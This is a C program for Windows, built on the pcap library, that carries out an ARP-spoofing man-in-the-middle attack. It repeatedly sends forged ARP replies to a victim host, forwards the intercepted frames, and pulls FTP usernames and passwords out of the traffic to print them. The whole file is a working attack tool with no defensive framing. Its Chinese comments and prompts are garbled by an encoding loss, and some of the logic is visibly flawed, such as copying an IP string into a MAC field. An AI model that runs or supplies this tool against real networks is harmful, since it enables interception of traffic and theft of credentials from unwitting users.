#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pcap.h>
#include <conio.h>
#include <winsock2.h>
#include <iphlpapi.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"pcap.lib")

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //��̫��Ŀ�ĵ�ַ
    unsigned char SrcMAC[6];     //��̫��Դ��ַ
    unsigned short EtherType;    //֡����
} DLCHEADER;

typedef struct ARP_Frame
{
    unsigned short HW_Type;       //Ӳ������
    unsigned short Prot_Type;     //�ϲ�Э������
    unsigned char HW_Addr_Len;    //MAC��ַ����
    unsigned char Prot_Addr_Len;  //IP��ַ����
    unsigned short Opcode;        //������,01��ʾ����02��ʾӦ��

    unsigned char Send_HW_Addr[6]; //���Ͷ�MAC��ַ
    unsigned char Send_Prot_Addr[4];   //���Ͷ�IP��ַ
    unsigned char Targ_HW_Addr[6]; //Ŀ��MAC��ַ
    unsigned char Targ_Prot_Addr[4];   //Ŀ��IP��ַ
} ARPFRAME;

typedef struct ipheader
{
    unsigned char ip_hl:4;         /*header length(��ͷ���ȣ�*/
    unsigned char ip_v:4;          /*version(�汾)*/
    unsigned char ip_tos;          /*type os service��������*/
    unsigned short int ip_len;     /*total length (�ܳ���)*/
    unsigned short int ip_id;      /*identification (��ʶ��)*/
    unsigned short int ip_off;     /*fragment offset field(����λ��)*/
    unsigned char ip_ttl;          /*time to live (����ʱ��)*/
    unsigned char ip_p;            /*protocol(Э��)*/
    unsigned short int ip_sum;     /*checksum(У���)*/
    unsigned char ip_src[4];       /*source address(Դ��ַ)*/
    unsigned char ip_dst[4];       /*destination address(Ŀ�ĵ�ַ)*/
} IP;

typedef struct tcpheader
{
    unsigned short int sport;    /*source port (Դ�˿ں�)*/
    unsigned short int dport;    /*destination port(Ŀ�Ķ˿ں�)*/
    unsigned int th_seq;         /*sequence number(�������к�)*/
    unsigned int th_ack;         /*acknowledgement number(ȷ��Ӧ���)*/
    unsigned char th_x:4;        /*unused(δʹ��)*/
    unsigned char th_off:4;      /*data offset(����ƫ����)*/
    unsigned char Flags;         /*��־ȫ*/
    unsigned short int th_win;   /*windows(����)*/
    unsigned short int th_sum;   /*checksum(У���)*/
    unsigned short int th_urp;   /*urgent pointer(����ָ��)*/
} TCP;

typedef struct
{
    pcap_t *hpcap;                        //����������
    unsigned char myIP[4];                //����IP
    unsigned char myMAC[6];               //����MAC
    unsigned char srcIP[4];               //��ԴIP
    unsigned char srcMAC[6];              //ԴMAC
    unsigned char desMAC[6];              //Ŀ��MAC
    unsigned char desIP[4];               //Ŀ��IP
    char **Packet;                         //���ݰ�ָ��
    struct pcap_pkthdr pkthdr;            //�������ݰ���С
} PacketInfo;

BOOL GetAdapterMAC(char *ipbuff,char *macbuff)
{
    IP_ADAPTER_INFO AdapterInfo[16];  //����洢������Ϣ�Ľṹ����
    DWORD ArrayLength=sizeof(AdapterInfo);  //����������
    if(GetAdaptersInfo(AdapterInfo,&ArrayLength)!=ERROR_SUCCESS)
        return ERROR;
    PIP_ADAPTER_INFO PAdapterInfo=AdapterInfo;

    do
    {
        if(!strcmp(ipbuff,PAdapterInfo->IpAddressList.IpAddress.String)) break;
        PAdapterInfo=PAdapterInfo->Next;
    }
    while(PAdapterInfo);

    memset(macbuff,NULL,6);
    memcpy(macbuff,PAdapterInfo->Address,6);         //��ȡ����MAC��ַ

    return TRUE;
}

char *iptos(u_long in)
{
    static char output[12][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == 12 ? 0 : which + 1);
    sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

BOOL ChooseDev(char *devbuff,int buffsize,char *ipbuff)
{
    pcap_if_t *alldevs=NULL,*p=NULL;
    char errbuff[PCAP_ERRBUF_SIZE];
    int i,choose;
    pcap_addr_t *a=NULL;

    memset(devbuff,NULL,buffsize);

    if(pcap_findalldevs(&alldevs,errbuff)!=0)
        return ERROR;

    for(p=alldevs,i=0; p; p=p->next)
    {
        printf("%d.%s(%s)\n",++i,p->name,p->description);
        if((a=p->addresses))
        {
            switch(a->addr->sa_family)
            {
            case AF_INET:
                printf("Address Family Name: AF_INET\n");
                if (a->addr)
                    /* Y- IP ��ַ */
                    printf("Address: %s\n",iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
                if (a->netmask)
                    /* Y- ���� */
                    printf("Netmask: %s\n",iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
                break;
            default:
                /* δ֪ */
                printf("Address Family Name: Unknown\n");
                break;
            }
        }
        printf("------------------------------------------------------\n");
    }

    do
    {
        printf("��ѡ��һ������:");
        fflush(stdin);
    }
    while(scanf("%d",&choose)!=1 || choose<1 ||choose>i);

    for(p=alldevs,i=1; i!=choose; p=p->next,i++);
    strcat(devbuff,p->name);
    memset(ipbuff,NULL,15);
    a=p->addresses;
    strcat(ipbuff,iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
    pcap_freealldevs(alldevs);

    return TRUE;
}

void Fill_ARPPACKET(char *ARPPacket,int packetsize,char *desmac,char *desIP,char *srcmac,char *srcip,int op)
{
    /*
        *ARPPacket    ָ��Ҫ�������ݰ�ָ��
         packetsize   ���ݰ���С
        *desmac ָ�����Ŀ��MAC�Ļ�������ַ
        *desIP  ָ�����Ŀ��IP�Ļ�������ַ
        *srcmac ָ�������ԴMAC�Ļ�������ַ
        *srcip  ָ�������ԴIP�Ļ�������ַ
         op     ARP������
        */
    DLCHEADER *DLCHeader=(DLCHEADER *)ARPPacket;
    ARPFRAME *ARPFrame=(ARPFRAME *)(ARPPacket+sizeof(DLCHEADER));
    memset(ARPPacket,NULL,packetsize);  //��հ�����
//�����̫��Ŀ�ĵ�ַ
    if(op==1)    //��ʾARP�����.
    {
        memset(DLCHeader->DesMAC,0xff,6);    //��ffffffffffff�����̫��ͷĿ��MAC��ַ��
        memset(ARPFrame->Targ_Prot_Addr,NULL,4);
        memset(ARPFrame->Targ_HW_Addr,NULL,6);
    }
    else
    {
        memcpy(DLCHeader->DesMAC,desmac,6);
        memcpy(ARPFrame->Targ_Prot_Addr,desIP,4);
        memcpy(ARPFrame->Targ_HW_Addr,DLCHeader->DesMAC,6);
    }

    //�����̫��Դ��ַ
    memcpy(DLCHeader->SrcMAC,srcmac,6);
    memcpy(ARPFrame->Send_HW_Addr,srcmac,6);
    //���ARP��ԴIP
    memcpy(ARPFrame->Send_Prot_Addr,srcip,4);
    DLCHeader->EtherType=htons((unsigned short)0x0806);    //0x0806��ʾARPЭ�飬0x0800��ʾIPЭ��
    ARPFrame->HW_Addr_Len=(unsigned char)6;
    ARPFrame->Prot_Addr_Len=(unsigned char)4;
    ARPFrame->HW_Type=htons((unsigned short)1);
    ARPFrame->Opcode=htons((unsigned short)op);   //01��ʾ����02��ʾӦ��
    ARPFrame->Prot_Type=htons((unsigned short)0x0800);
}

typedef struct
{
    //�����̽��������
    char srcip[16];
    char desip[16];
    char username[50];
    char password[50];
} Sniffer_Result;

void FTP_Sniffer(char *Packet,int packetsize)
{
    static Sniffer_Result result= {0};
    IP *IPHeader=(IP *)Packet;
    TCP *TCPHeader=(TCP *)(Packet+sizeof(IP));
    char *data=(char *)(Packet+sizeof(IP)+sizeof(TCP));
    Packet[packetsize-2]=NULL;
    char *p=NULL;

    if(strlen(data)>4 && (p=strstr(data,"USER")))
    {
        if(strlen(result.username)<1)
        {
            strcat(result.srcip,inet_ntoa(*(struct in_addr *)IPHeader->ip_src));
            strcat(result.desip,inet_ntoa(*(struct in_addr *)IPHeader->ip_dst));
            strcat(result.username,p+5);
        }
    }
    if(strlen(data)>4 && (p=strstr(data,"PASS")))
    {
        if(strlen(result.username)>0)
        {
            strcat(result.password,p+5);
            printf("FTP:\n��Դ��ַ:%s\nĿ���ַ:%s\nUSER:%s\nPASS:%s\n",result.srcip,result.desip,\
                   result.username,result.password);
            printf("--------------------------------------------------------\n");
        }
        memset(&result,NULL,sizeof(Sniffer_Result));
    }

    return;
}

DWORD WINAPI filter(PVOID Parameter)
{
    BOOL SendPacket(pcap_t *hpcap,char *Packet,int packetsize);
    PacketInfo PI=*(PacketInfo *)Parameter;
    char *Packet=NULL;

    if((Packet=(char *)malloc(PI.pkthdr.caplen*sizeof(char)))==NULL) return -1;
    memcpy(Packet,*PI.Packet,PI.pkthdr.caplen);
    *PI.Packet=NULL;

    DLCHEADER *DLCHeader=NULL;
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;

    DLCHeader=(DLCHEADER *)Packet;
    IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(Packet+sizeof(DLCHEADER)+sizeof(IP));

    if(!strncmp(DLCHeader->SrcMAC,PI.srcMAC,6) && !strncmp(DLCHeader->DesMAC,PI.myMAC,6))
    {
        memcpy(DLCHeader->DesMAC,PI.desMAC,6);
        SendPacket(PI.hpcap,Packet,PI.pkthdr.caplen);    //ת�����ݰ�
    }

    //���֡������Э������
    if(ntohs(DLCHeader->EtherType)==0x0800 && IPHeader->ip_p==0x06)
    {
        if(ntohs(TCPHeader->dport)==21) FTP_Sniffer(IPHeader,PI.pkthdr.caplen-sizeof(DLCHEADER));   //����FTP���ݰ�
    }
    free(Packet);

    return 0;
}

DWORD WINAPI Ether_Sniffer(PVOID Parameter)
{
    PacketInfo PI=*(PacketInfo *)Parameter;
    pcap_t *hpcap=PI.hpcap;
    struct pcap_pkthdr *pkthdr=NULL;
    char *recvBuff;
    HANDLE hFilterThread;

    while(TRUE)
    {
        if(pcap_next_ex(hpcap,&pkthdr,&recvBuff)>0)
        {
            PI.Packet=&recvBuff;
            PI.pkthdr=*pkthdr;
            CloseHandle((hFilterThread=CreateThread(NULL,0,filter,(PVOID)&PI,0,NULL)));
            while(recvBuff);
        }
    }

    return 0;
}

BOOL SendPacket(pcap_t *hpcap,char *Packet,int packetsize)
{
    if(pcap_sendpacket(hpcap,Packet,packetsize)!=0)
    {
        printf("���ݰ�����ʧ�ܡ�\n");
        return ERROR;
    }
    return TRUE;
}


pcap_t *OpenAdapter(char *devName)
{
    pcap_t *hpcap=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];

    if((hpcap=pcap_open_live(devName,        // �豸��
                             65536,          // ָ��Ҫ��׽�����ݰ��Ĳ���,65536 ��֤��������·���ϵİ����ܹ���ץ��
                             1,    		     // ����ģʽ
                             1000,         	 // �����ݵĳ�ʱʱ��
                             errbuf          // ���󻺳���
                            ))==NULL)
    {
        printf("����������\n");
        return NULL;
    }
    return hpcap;
}
//A>>>>>������ƭ>>>>>>B
void Input(char *A_MAC,char *A_IP,char *B_MAC,char *B_IP)
{
    printf("A>>>>>������ƭ>>>>>>B\n");
    printf("������A������MAC:");
    fflush(stdin);
    if(scanf("%x-%x-%x-%x-%x-%x",&A_MAC[0],&A_MAC[1],&A_MAC[2],&A_MAC[3],&A_MAC[4],&A_MAC[5])!=6) exit(-1);
    printf("������A������IP:");
    fflush(stdin);
    gets(A_IP);

    printf("������B������MAC:");
    fflush(stdin);
    if(scanf("%x-%x-%x-%x-%x-%x",&B_MAC[0],&B_MAC[1],&B_MAC[2],&B_MAC[3],&B_MAC[4],&B_MAC[5])!=6) exit(-1);
    printf("������B������IP:");
    fflush(stdin);
    gets(B_IP);
}

int main(int argc,char *argv[])
{
    char devName[100];
    char myIPAddress[15],myMAC[6];
    char ARPPacket[42];
    char A_IP[15]= {0},A_MAC[6]= {0};
    char B_IP[15]= {0},B_MAC[6]= {0};
    pcap_t *hpcap=NULL;
    HANDLE hSnifferThread;
    PacketInfo PI;
    unsigned long A_addr,B_addr;

    if(ChooseDev(devName,sizeof(devName),myIPAddress)!=TRUE)
    {
        printf("��ȡ����ʧ�ܡ�\n");
        getch();
        return -1;
    }
    //��ȡ��������MAC
    if(GetAdapterMAC(myIPAddress,myMAC)!=TRUE)
    {
        printf("��ȡ����MACʧ�ܡ�\n");
        getch();
        return -1;
    }
    //������
    if((hpcap=OpenAdapter(devName))==NULL)
    {
        printf("�����򿪳���\n");
        getch();
        return -1;
    }

    //������ƭ������Ϣ    A>>>>>������ƭ>>>>>>B
    Input(A_MAC,A_IP,B_MAC,B_IP);
    A_addr=inet_addr(A_IP);
    B_addr=inet_addr(B_IP);
    //��ARPӦ��ķ�ʽ��ƭ����A
    Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),A_MAC,(char *)&A_addr,myMAC,(char *)&B_addr,2);

    //��䴫�ݲ���
    PI.hpcap=hpcap;
    memcpy(PI.srcMAC,A_IP,6);
    memcpy(PI.desIP,(char *)&B_addr,4);
    memcpy(PI.desMAC,B_MAC,6);
    memcpy(PI.srcIP,(char *)&A_addr,4);
    memcpy(PI.myIP,myIPAddress,4);
    memcpy(PI.myMAC,myMAC,6);
    //������̽�߳�
    CloseHandle((hSnifferThread=CreateThread(NULL,0,Ether_Sniffer,(PVOID)&PI,0,NULL)));

    while(1)
    {
        Sleep(1000);
        SendPacket(hpcap,ARPPacket,sizeof(ARPPacket));   //����ARP��ƭ��
    }

    return 0;
}
